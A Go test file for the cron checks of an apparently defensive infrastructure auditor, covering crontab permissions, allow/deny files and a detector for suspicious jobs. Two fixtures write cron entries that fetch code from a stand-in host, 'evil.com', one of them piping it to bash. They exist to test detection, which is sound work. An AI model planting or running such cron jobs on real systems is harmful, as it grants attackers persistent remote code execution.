package cron

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/civanmoreno/infraudit/internal/check"
)

func setupTmpRoot(t *testing.T) string {
	t.Helper()
	tmp := t.TempDir()
	check.FSRoot = tmp
	t.Cleanup(func() {
		check.FSRoot = ""
		check.ResetCache()
	})
	return tmp
}

func mkdirAll(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0755); err != nil { //nolint:gosec
		t.Fatal(err)
	}
}

func writeFile(t *testing.T, path, content string, perm os.FileMode) {
	t.Helper()
	mkdirAll(t, filepath.Dir(path))
	if err := os.WriteFile(path, []byte(content), perm); err != nil {
		t.Fatal(err)
	}
}

// --- crontabPerms tests ---

func TestCrontabPerms_Pass(t *testing.T) {
	tmp := setupTmpRoot(t)
	crontab := filepath.Join(tmp, "etc", "crontab")
	writeFile(t, crontab, "# system crontab\n", 0600)

	c := &crontabPerms{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS, got %s: %s", r.Status, r.Message)
	}
}

func TestCrontabPerms_Warn(t *testing.T) {
	tmp := setupTmpRoot(t)
	crontab := filepath.Join(tmp, "etc", "crontab")
	writeFile(t, crontab, "# system crontab\n", 0644)

	c := &crontabPerms{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestCrontabPerms_PassMissing(t *testing.T) {
	_ = setupTmpRoot(t)
	c := &crontabPerms{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS (missing file), got %s: %s", r.Status, r.Message)
	}
}

// --- cronAllow tests ---

func TestCronAllow_Pass(t *testing.T) {
	tmp := setupTmpRoot(t)
	writeFile(t, filepath.Join(tmp, "etc", "cron.allow"), "root\n", 0600)
	// Ensure cron.deny does NOT exist (it shouldn't since we didn't create it).

	c := &cronAllow{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS, got %s: %s", r.Status, r.Message)
	}
}

func TestCronAllow_WarnMissing(t *testing.T) {
	_ = setupTmpRoot(t)
	// Neither cron.allow nor cron.deny exists.
	c := &cronAllow{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestCronAllow_WarnDenyExists(t *testing.T) {
	tmp := setupTmpRoot(t)
	writeFile(t, filepath.Join(tmp, "etc", "cron.allow"), "root\n", 0600)
	writeFile(t, filepath.Join(tmp, "etc", "cron.deny"), "", 0600)

	c := &cronAllow{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN (cron.deny exists), got %s: %s", r.Status, r.Message)
	}
}

// --- atAllow tests ---

func TestAtAllow_Pass(t *testing.T) {
	tmp := setupTmpRoot(t)
	writeFile(t, filepath.Join(tmp, "etc", "at.allow"), "root\n", 0600)

	c := &atAllow{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS, got %s: %s", r.Status, r.Message)
	}
}

func TestAtAllow_WarnMissing(t *testing.T) {
	_ = setupTmpRoot(t)
	c := &atAllow{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestAtAllow_WarnDenyExists(t *testing.T) {
	tmp := setupTmpRoot(t)
	writeFile(t, filepath.Join(tmp, "etc", "at.allow"), "root\n", 0600)
	writeFile(t, filepath.Join(tmp, "etc", "at.deny"), "", 0600)

	c := &atAllow{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN (at.deny exists), got %s: %s", r.Status, r.Message)
	}
}

// --- suspiciousJobs tests ---

func TestSuspiciousJobs_Warn(t *testing.T) {
	tmp := setupTmpRoot(t)
	cronD := filepath.Join(tmp, "etc", "cron.d")
	writeFile(t, filepath.Join(cronD, "backdoor"),
		"* * * * * root curl http://evil.com/payload | bash\n", 0600)

	c := &suspiciousJobs{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestSuspiciousJobs_WarnWget(t *testing.T) {
	tmp := setupTmpRoot(t)
	crontab := filepath.Join(tmp, "etc", "crontab")
	writeFile(t, crontab,
		"0 3 * * * root wget http://evil.com/malware -O /tmp/m\n", 0600)

	c := &suspiciousJobs{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestSuspiciousJobs_Pass(t *testing.T) {
	tmp := setupTmpRoot(t)
	cronD := filepath.Join(tmp, "etc", "cron.d")
	writeFile(t, filepath.Join(cronD, "logrotate"),
		"0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n", 0600)
	writeFile(t, filepath.Join(tmp, "etc", "crontab"),
		"# clean crontab\n", 0600)

	c := &suspiciousJobs{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS, got %s: %s", r.Status, r.Message)
	}
}

func TestSuspiciousJobs_CommentsIgnored(t *testing.T) {
	tmp := setupTmpRoot(t)
	writeFile(t, filepath.Join(tmp, "etc", "crontab"),
		"# curl http://example.com is just a comment\n", 0600)

	c := &suspiciousJobs{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS (comment line), got %s: %s", r.Status, r.Message)
	}
}

// --- cronDirPerms tests ---

func TestCronDirPerms_Pass(t *testing.T) {
	tmp := setupTmpRoot(t)
	for _, dir := range []string{"cron.hourly", "cron.daily", "cron.weekly", "cron.monthly"} {
		mkdirAll(t, filepath.Join(tmp, "etc", dir))
		if err := os.Chmod(filepath.Join(tmp, "etc", dir), 0700); err != nil { //nolint:gosec
			t.Fatal(err)
		}
	}

	c := &cronDirPerms{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS, got %s: %s", r.Status, r.Message)
	}
}

func TestCronDirPerms_Warn(t *testing.T) {
	tmp := setupTmpRoot(t)
	dir := filepath.Join(tmp, "etc", "cron.daily")
	mkdirAll(t, dir)
	if err := os.Chmod(dir, 0755); err != nil { //nolint:gosec
		t.Fatal(err)
	}

	c := &cronDirPerms{}
	r := c.Run()
	if r.Status != check.Warn {
		t.Errorf("expected WARN, got %s: %s", r.Status, r.Message)
	}
}

func TestCronDirPerms_PassMissing(t *testing.T) {
	_ = setupTmpRoot(t)
	c := &cronDirPerms{}
	r := c.Run()
	if r.Status != check.Pass {
		t.Errorf("expected PASS (no dirs), got %s: %s", r.Status, r.Message)
	}
}
